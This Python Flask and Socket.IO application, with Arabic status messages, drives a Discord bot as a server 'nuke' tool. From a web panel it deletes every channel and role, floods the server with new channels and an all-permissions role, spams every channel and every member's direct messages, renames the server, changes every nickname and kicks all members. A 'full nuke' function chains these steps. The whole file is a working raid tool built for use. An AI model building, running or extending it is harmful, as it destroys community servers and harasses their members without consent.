import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))  # DON'T CHANGE THIS !!!

import asyncio
import json
import base64
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
import discord
from discord.ext import commands
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global variables
bot_instances = {}
current_tokens = {}

# Serve static files
@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('static', path)

# Handle avatar upload
@app.route('/upload_avatar', methods=['POST'])
def upload_avatar():
    if 'avatar' not in request.files:
        return jsonify({'success': False, 'message': 'No file part'})
    
    file = request.files['avatar']
    if file.filename == '':
        return jsonify({'success': False, 'message': 'No selected file'})
    
    try:
        # Read file as bytes
        file_data = file.read()
        
        # Get session ID
        sid = request.sid if hasattr(request, 'sid') else None
        if not sid:
            for key in request.cookies:
                if key.startswith('io='):
                    sid = key[3:]
                    break
        
        if not sid or sid not in current_tokens:
            return jsonify({'success': False, 'message': 'Session not found'})
        
        # Get bot instance
        bot = bot_instances.get(sid)
        if not bot:
            return jsonify({'success': False, 'message': 'Bot not found'})
        
        # Update server icon
        server_id = bot.current_server_id
        if not server_id:
            return jsonify({'success': False, 'message': 'No server selected'})
        
        # Convert to base64 for discord.py
        server = bot.get_guild(int(server_id))
        if not server:
            return jsonify({'success': False, 'message': 'Server not found'})
        
        # Run in a separate thread to avoid blocking
        def update_icon():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(server.edit(icon=file_data))
            loop.close()
        
        threading.Thread(target=update_icon).start()
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Error uploading avatar: {e}")
        return jsonify({'success': False, 'message': str(e)})

# Discord Bot Class
class DiscordBot(commands.Bot):
    def __init__(self, token, sid):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.token = token
        self.sid = sid
        self.current_server_id = None
        self.is_ready = False
        self.loop = asyncio.new_event_loop()
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
    
    async def on_ready(self):
        print(f'Logged in as {self.user.name}')
        self.is_ready = True
        
        # Get servers
        servers = []
        for guild in self.guilds:
            icon_url = str(guild.icon.url) if guild.icon else None
            servers.append({
                'id': str(guild.id),
                'name': guild.name,
                'memberCount': len(guild.members),
                'icon': icon_url
            })
        
        # Emit to client
        socketio.emit('auth_success', {'servers': servers}, room=self.sid)
    
    def run_bot(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.start(self.token))
    
    def stop_bot(self):
        self.loop.run_until_complete(self.close())
        self.loop.close()
    
    # Server operations
    async def get_server_info(self, server_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return None
        
        return {
            'id': str(guild.id),
            'name': guild.name,
            'memberCount': len(guild.members),
            'icon': str(guild.icon.url) if guild.icon else None
        }
    
    async def get_rooms(self, server_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return []
        
        rooms = []
        for channel in guild.text_channels:
            rooms.append({
                'id': str(channel.id),
                'name': channel.name
            })
        
        return rooms
    
    async def get_roles(self, server_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return []
        
        roles = []
        for role in guild.roles:
            if role.name != '@everyone':
                roles.append({
                    'id': str(role.id),
                    'name': role.name,
                    'color': str(role.color)
                })
        
        return roles
    
    # Nuke operations - with asyncio for concurrency
    async def create_rooms(self, server_id, count, name, delete_old=False):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            # Delete old channels if requested
            if delete_old:
                delete_tasks = []
                for channel in guild.channels:
                    delete_tasks.append(channel.delete())
                
                if delete_tasks:
                    await asyncio.gather(*delete_tasks)
                    await asyncio.sleep(1)  # Small delay to ensure deletion completes
            
            # Create new channels concurrently
            create_tasks = []
            for i in range(int(count)):
                channel_name = f"{name}-{i+1}" if count > 1 else name
                create_tasks.append(guild.create_text_channel(channel_name))
            
            await asyncio.gather(*create_tasks)
            return True
        except Exception as e:
            print(f"Error creating rooms: {e}")
            return False
    
    async def delete_room(self, server_id, room_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        channel = guild.get_channel(int(room_id))
        if not channel:
            return False
        
        try:
            await channel.delete()
            return True
        except Exception as e:
            print(f"Error deleting room: {e}")
            return False
    
    async def create_roles(self, server_id, count, name, delete_old=False):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            # Delete old roles if requested
            if delete_old:
                delete_tasks = []
                for role in guild.roles:
                    if role.name != '@everyone':
                        delete_tasks.append(role.delete())
                
                if delete_tasks:
                    await asyncio.gather(*delete_tasks)
                    await asyncio.sleep(1)  # Small delay to ensure deletion completes
            
            # Create new roles concurrently
            create_tasks = []
            for i in range(int(count)):
                role_name = f"{name}-{i+1}" if count > 1 else name
                # First role is admin
                if i == 0:
                    create_tasks.append(guild.create_role(
                        name=role_name,
                        color=discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
                        permissions=discord.Permissions.all()
                    ))
                else:
                    create_tasks.append(guild.create_role(
                        name=role_name,
                        color=discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                    ))
            
            await asyncio.gather(*create_tasks)
            return True
        except Exception as e:
            print(f"Error creating roles: {e}")
            return False
    
    async def delete_role(self, server_id, role_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        role = guild.get_role(int(role_id))
        if not role:
            return False
        
        try:
            await role.delete()
            return True
        except Exception as e:
            print(f"Error deleting role: {e}")
            return False
    
    async def spam_channels(self, server_id, message, count):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            spam_tasks = []
            for channel in guild.text_channels:
                for _ in range(int(count)):
                    spam_tasks.append(channel.send(message))
            
            # Execute in batches to avoid rate limits
            batch_size = 10
            for i in range(0, len(spam_tasks), batch_size):
                batch = spam_tasks[i:i+batch_size]
                await asyncio.gather(*batch)
                await asyncio.sleep(0.5)  # Small delay between batches
            
            return True
        except Exception as e:
            print(f"Error spamming channels: {e}")
            return False
    
    async def spam_dms(self, server_id, message):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            dm_tasks = []
            for member in guild.members:
                if not member.bot and member.id != self.user.id:
                    dm_tasks.append(member.send(message))
            
            # Execute in batches to avoid rate limits
            batch_size = 5
            for i in range(0, len(dm_tasks), batch_size):
                batch = dm_tasks[i:i+batch_size]
                try:
                    await asyncio.gather(*batch)
                    await asyncio.sleep(1)  # Larger delay for DMs to avoid bans
                except:
                    pass  # Continue even if some DMs fail
            
            return True
        except Exception as e:
            print(f"Error spamming DMs: {e}")
            return False
    
    async def update_server(self, server_id, name):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            await guild.edit(name=name)
            return True
        except Exception as e:
            print(f"Error updating server: {e}")
            return False
    
    async def kick_all_members(self, server_id):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            kick_tasks = []
            for member in guild.members:
                if not member.bot and member.id != self.user.id and guild.me.top_role > member.top_role:
                    kick_tasks.append(member.kick(reason="Mass kick"))
            
            # Execute in batches to avoid rate limits
            batch_size = 5
            for i in range(0, len(kick_tasks), batch_size):
                batch = kick_tasks[i:i+batch_size]
                try:
                    await asyncio.gather(*batch)
                    await asyncio.sleep(1)  # Delay between batches
                except:
                    pass  # Continue even if some kicks fail
            
            return True
        except Exception as e:
            print(f"Error kicking members: {e}")
            return False
    
    async def change_all_nicknames(self, server_id, nickname):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            nickname_tasks = []
            for member in guild.members:
                if not member.bot and member.id != self.user.id and guild.me.top_role > member.top_role:
                    nickname_tasks.append(member.edit(nick=nickname))
            
            # Execute in batches to avoid rate limits
            batch_size = 5
            for i in range(0, len(nickname_tasks), batch_size):
                batch = nickname_tasks[i:i+batch_size]
                try:
                    await asyncio.gather(*batch)
                    await asyncio.sleep(1)  # Delay between batches
                except:
                    pass  # Continue even if some edits fail
            
            return True
        except Exception as e:
            print(f"Error changing nicknames: {e}")
            return False
    
    # Full nuke operation - execute all operations in parallel
    async def execute_full_nuke(self, server_id, options):
        guild = self.get_guild(int(server_id))
        if not guild:
            return False
        
        try:
            # Prepare all tasks based on options
            tasks = []
            
            # Rooms tasks
            if options.get('create_rooms', False):
                tasks.append(self.create_rooms(
                    server_id,
                    options.get('room_count', 10),
                    options.get('room_name', 'nuked'),
                    options.get('delete_old_rooms', False)
                ))
            
            # Roles tasks
            if options.get('create_roles', False):
                tasks.append(self.create_roles(
                    server_id,
                    options.get('role_count', 10),
                    options.get('role_name', 'nuked'),
                    options.get('delete_old_roles', False)
                ))
            
            # Server settings tasks
            if options.get('update_server', False):
                tasks.append(self.update_server(
                    server_id,
                    options.get('server_name', 'NUKED SERVER')
                ))
            
            # Execute initial tasks concurrently
            await asyncio.gather(*tasks)
            
            # Second wave of tasks that depend on the first wave
            tasks2 = []
            
            # Spam tasks
            if options.get('spam_channels', False):
                tasks2.append(self.spam_channels(
                    server_id,
                    options.get('channel_spam_message', 'SERVER NUKED!'),
                    options.get('message_count', 5)
                ))
            
            if options.get('spam_dms', False):
                tasks2.append(self.spam_dms(
                    server_id,
                    options.get('dm_spam_message', 'SERVER NUKED!')
                ))
            
            # Nickname tasks
            if options.get('change_nicknames', False):
                tasks2.append(self.change_all_nicknames(
                    server_id,
                    options.get('nickname', 'nuked')
                ))
            
            # Execute second wave concurrently
            await asyncio.gather(*tasks2)
            
            # Final wave - kick all members (if requested)
            if options.get('kick_all', False):
                await self.kick_all_members(server_id)
            
            return True
        except Exception as e:
            print(f"Error executing full nuke: {e}")
            return False

# Socket.io events
@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')
    
    # Clean up bot instance if exists
    if request.sid in bot_instances:
        bot = bot_instances[request.sid]
        try:
            bot.stop_bot()
        except:
            pass
        del bot_instances[request.sid]
    
    if request.sid in current_tokens:
        del current_tokens[request.sid]

@socketio.on('authenticate')
def handle_authenticate(data):
    token = data.get('token')
    if not token:
        emit('auth_error', {'message': 'No token provided'})
        return
    
    # Clean up existing bot instance if any
    if request.sid in bot_instances:
        bot = bot_instances[request.sid]
        try:
            bot.stop_bot()
        except:
            pass
        del bot_instances[request.sid]
    
    # Create new bot instance
    bot = DiscordBot(token, request.sid)
    bot_instances[request.sid] = bot
    current_tokens[request.sid] = token
    
    # Start bot in a separate thread
    threading.Thread(target=bot.run_bot).start()

@socketio.on('select_server')
def handle_select_server(data):
    server_id = data.get('server_id')
    if not server_id:
        emit('operation_error', {'message': 'No server ID provided'})
        return
    
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    bot.current_server_id = server_id
    
    emit('server_selected', {'server_id': server_id, 'server_name': 'Loading...'})

@socketio.on('get_server_info')
def handle_get_server_info():
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    # Run in a separate thread
    def get_info():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        server_info = loop.run_until_complete(bot.get_server_info(bot.current_server_id))
        loop.close()
        
        if server_info:
            socketio.emit('server_info', server_info, room=request.sid)
        else:
            socketio.emit('operation_error', {'message': 'Failed to get server info'}, room=request.sid)
    
    threading.Thread(target=get_info).start()

@socketio.on('get_rooms')
def handle_get_rooms():
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    # Run in a separate thread
    def get_rooms():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        rooms = loop.run_until_complete(bot.get_rooms(bot.current_server_id))
        loop.close()
        
        socketio.emit('rooms_list', {'rooms': rooms}, room=request.sid)
    
    threading.Thread(target=get_rooms).start()

@socketio.on('get_roles')
def handle_get_roles():
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    # Run in a separate thread
    def get_roles():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        roles = loop.run_until_complete(bot.get_roles(bot.current_server_id))
        loop.close()
        
        socketio.emit('roles_list', {'roles': roles}, room=request.sid)
    
    threading.Thread(target=get_roles).start()

@socketio.on('create_rooms')
def handle_create_rooms(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    count = data.get('count', 1)
    name = data.get('name', 'new-channel')
    delete_old = data.get('delete_old', False)
    
    # Run in a separate thread
    def create_rooms():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إنشاء الرومات...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.create_rooms(bot.current_server_id, count, name, delete_old))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم إنشاء الرومات بنجاح'}, room=request.sid)
            # Refresh rooms list
            handle_get_rooms()
        else:
            socketio.emit('operation_error', {'message': 'فشل في إنشاء الرومات'}, room=request.sid)
    
    threading.Thread(target=create_rooms).start()

@socketio.on('delete_room')
def handle_delete_room(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    room_id = data.get('room_id')
    if not room_id:
        emit('operation_error', {'message': 'No room ID provided'})
        return
    
    # Run in a separate thread
    def delete_room():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        success = loop.run_until_complete(bot.delete_room(bot.current_server_id, room_id))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم حذف الروم بنجاح'}, room=request.sid)
            # Refresh rooms list
            handle_get_rooms()
        else:
            socketio.emit('operation_error', {'message': 'فشل في حذف الروم'}, room=request.sid)
    
    threading.Thread(target=delete_room).start()

@socketio.on('create_roles')
def handle_create_roles(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    count = data.get('count', 1)
    name = data.get('name', 'new-role')
    delete_old = data.get('delete_old', False)
    
    # Run in a separate thread
    def create_roles():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إنشاء الرولات...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.create_roles(bot.current_server_id, count, name, delete_old))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم إنشاء الرولات بنجاح'}, room=request.sid)
            # Refresh roles list
            handle_get_roles()
        else:
            socketio.emit('operation_error', {'message': 'فشل في إنشاء الرولات'}, room=request.sid)
    
    threading.Thread(target=create_roles).start()

@socketio.on('delete_role')
def handle_delete_role(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    role_id = data.get('role_id')
    if not role_id:
        emit('operation_error', {'message': 'No role ID provided'})
        return
    
    # Run in a separate thread
    def delete_role():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        success = loop.run_until_complete(bot.delete_role(bot.current_server_id, role_id))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم حذف الرول بنجاح'}, room=request.sid)
            # Refresh roles list
            handle_get_roles()
        else:
            socketio.emit('operation_error', {'message': 'فشل في حذف الرول'}, room=request.sid)
    
    threading.Thread(target=delete_role).start()

@socketio.on('spam_channels')
def handle_spam_channels(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    message = data.get('message', 'SERVER NUKED!')
    count = data.get('count', 5)
    
    # Run in a separate thread
    def spam_channels():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إرسال السبام للرومات...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.spam_channels(bot.current_server_id, message, count))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم إرسال السبام للرومات بنجاح'}, room=request.sid)
        else:
            socketio.emit('operation_error', {'message': 'فشل في إرسال السبام للرومات'}, room=request.sid)
    
    threading.Thread(target=spam_channels).start()

@socketio.on('spam_dms')
def handle_spam_dms(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    message = data.get('message', 'SERVER NUKED!')
    
    # Run in a separate thread
    def spam_dms():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إرسال السبام للأعضاء...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.spam_dms(bot.current_server_id, message))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم إرسال السبام للأعضاء بنجاح'}, room=request.sid)
        else:
            socketio.emit('operation_error', {'message': 'فشل في إرسال السبام للأعضاء'}, room=request.sid)
    
    threading.Thread(target=spam_dms).start()

@socketio.on('update_server')
def handle_update_server(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    name = data.get('name')
    if not name:
        emit('operation_error', {'message': 'No name provided'})
        return
    
    # Run in a separate thread
    def update_server():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        success = loop.run_until_complete(bot.update_server(bot.current_server_id, name))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم تحديث اسم السيرفر بنجاح'}, room=request.sid)
            # Refresh server info
            handle_get_server_info()
        else:
            socketio.emit('operation_error', {'message': 'فشل في تحديث اسم السيرفر'}, room=request.sid)
    
    threading.Thread(target=update_server).start()

@socketio.on('kick_all_members')
def handle_kick_all_members():
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    # Run in a separate thread
    def kick_all_members():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء طرد جميع الأعضاء...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.kick_all_members(bot.current_server_id))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم طرد جميع الأعضاء بنجاح'}, room=request.sid)
            # Refresh server info
            handle_get_server_info()
        else:
            socketio.emit('operation_error', {'message': 'فشل في طرد جميع الأعضاء'}, room=request.sid)
    
    threading.Thread(target=kick_all_members).start()

@socketio.on('change_all_nicknames')
def handle_change_all_nicknames(data):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    nickname = data.get('nickname')
    if not nickname:
        emit('operation_error', {'message': 'No nickname provided'})
        return
    
    # Run in a separate thread
    def change_all_nicknames():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء تغيير أسماء جميع الأعضاء...'}, room=request.sid)
        
        success = loop.run_until_complete(bot.change_all_nicknames(bot.current_server_id, nickname))
        loop.close()
        
        if success:
            socketio.emit('operation_complete', {'message': 'تم تغيير أسماء جميع الأعضاء بنجاح'}, room=request.sid)
        else:
            socketio.emit('operation_error', {'message': 'فشل في تغيير أسماء جميع الأعضاء'}, room=request.sid)
    
    threading.Thread(target=change_all_nicknames).start()

@socketio.on('execute_full_nuke')
def handle_execute_full_nuke(options):
    if request.sid not in bot_instances:
        emit('auth_error', {'message': 'Not authenticated'})
        return
    
    bot = bot_instances[request.sid]
    if not bot.current_server_id:
        emit('operation_error', {'message': 'No server selected'})
        return
    
    # Run in a separate thread
    def execute_full_nuke():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Send progress updates
        socketio.emit('full_nuke_progress', {'overall_progress': 10, 'message': 'بدء تنفيذ النيوك الشامل...'}, room=request.sid)
        
        # Execute full nuke
        success = loop.run_until_complete(bot.execute_full_nuke(bot.current_server_id, options))
        loop.close()
        
        if success:
            socketio.emit('full_nuke_complete', room=request.sid)
            # Refresh all data
            handle_get_server_info()
            handle_get_rooms()
            handle_get_roles()
        else:
            socketio.emit('operation_error', {'message': 'فشل في تنفيذ النيوك الشامل'}, room=request.sid)
    
    threading.Thread(target=execute_full_nuke).start()

@socketio.on('logout')
def handle_logout():
    if request.sid in bot_instances:
        bot = bot_instances[request.sid]
        try:
            bot.stop_bot()
        except:
            pass
        del bot_instances[request.sid]
    
    if request.sid in current_tokens:
        del current_tokens[request.sid]
    
    emit('auth_error', {'message': 'تم تسجيل الخروج بنجاح'})

# Run the app
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
